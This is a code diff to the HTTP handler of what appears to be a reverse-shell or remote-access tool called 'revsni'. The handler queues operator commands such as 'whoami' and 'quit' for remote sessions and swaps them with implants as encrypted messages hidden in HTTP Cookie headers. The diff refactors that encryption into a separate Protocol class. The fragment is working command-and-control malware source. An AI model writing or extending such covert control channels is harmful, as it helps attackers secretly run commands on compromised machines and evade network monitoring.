@@ -17,6 +17,9 @@ import org.apache.http.protocol.HttpRequestHandler;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+//import com.revsni.client.Encri.Encri;
+//import com.revsni.client.Encri.RSA;
+import com.revsni.server.Protocol;
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
 
@@ -46,6 +49,7 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler{
     private volatile int sessionNumber;
     private volatile String ip;
     private volatile boolean first = true;
+    private Protocol protocol;
 
     private Cipher cipherDec;
     private Cipher cipherEnc;
@@ -76,16 +80,19 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler{
 
     }
 
+    public HTTPHandler(int sessionNumber, Protocol protocol) {
+        super();
+        this.sessionNumber = sessionNumber;
+        this.protocol = protocol;
+    }
+
     public void sendCommand(String command) {
         String respo = command;
-        try {
-            answerCommands = new String(Base64.encodeBase64String(cipherEnc.doFinal(respo.getBytes())));
-            logger.info("Waiting for Response..");
-            respo = "";
-        } catch (IllegalBlockSizeException | BadPaddingException e) {
-            e.printStackTrace();
-        }
+        answerCommands = protocol.prepareMessage(respo, sessionNumber);
+        logger.info("Waiting for Response..");
+        respo = "";
     } 
+    
 
     @Override
     public void handle(HttpRequest request, HttpResponse response, HttpContext context) throws HttpException, IOException {
@@ -97,36 +104,25 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler{
             first = false;
         }
         if(request.getRequestLine().getMethod().toUpperCase().contains("GET") && request.getRequestLine().getUri().contains("lit")) {
+            response.removeHeaders("Cookie");
             if(request.getHeaders("Cookie") != null) {
                 cookie = request.getHeaders("Cookie")[0].getValue();
 
                 if(cookie.length() > 1) {
 
-                    try {
-                        msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
-                    } catch (IllegalBlockSizeException | BadPaddingException e) {
-                        e.printStackTrace();
-                    }
+                    msg = protocol.processMessage(cookie, sessionNumber);
+                        //msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
                     if(msg.equals("est")) {
                         est = true;
-                        try {
-                            response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes())));
-                        } catch (IllegalBlockSizeException | BadPaddingException e) {
-                            logger.info("Failed to send init whoami command (HTTP-Rev)");
-                        }
+                        response.setHeader("Cookie", protocol.prepareMessage("whoami", sessionNumber));
                     } else if(msg.equals("kill")) {
-                        try {
-                            response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes())));
-                        } catch (IllegalBlockSizeException | BadPaddingException e) {
-                            logger.info("Failed to send Quit command (HTTP-Rev)");
-                        }
+                         response.setHeader("Cookie", protocol.prepareMessage("quit", sessionNumber));
                     } else if(msg.equals("give") && answerCommands.length() > 0) {
                         response.setHeader("Cookie", answerCommands);
                         answerCommands = "";
                     } else if(msg.equals("give") && answerCommands.length() == 0) {
-
+                        response.setHeader("Cookie", "");
                     } else {
-                        logger.info(msg);
                         System.out.print("Revsn [HTTP]["+ ip +"]["+sessionNumber+"]» ");
                     }
                     response.setStatusCode(200);
